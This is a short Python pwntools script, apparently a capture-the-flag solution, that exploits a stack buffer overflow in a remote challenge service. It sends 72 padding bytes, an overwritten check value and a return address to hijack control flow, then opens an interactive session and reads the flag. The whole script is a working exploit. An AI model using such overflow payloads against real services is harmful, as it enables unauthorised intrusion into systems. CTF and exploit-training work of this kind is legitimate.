from pwn import *

io = remote("sisterlab.id", 42002)

payload = b"A" * 72 + p64(0xC0DEAB1E) + b"A" * 8 +  p64(0x401186)
io.sendlineafter(b'> ', payload)
io.interactive()
io.recvuntil(b'flag: ')
flag = io.recvline()

print(f'flag: {flag}')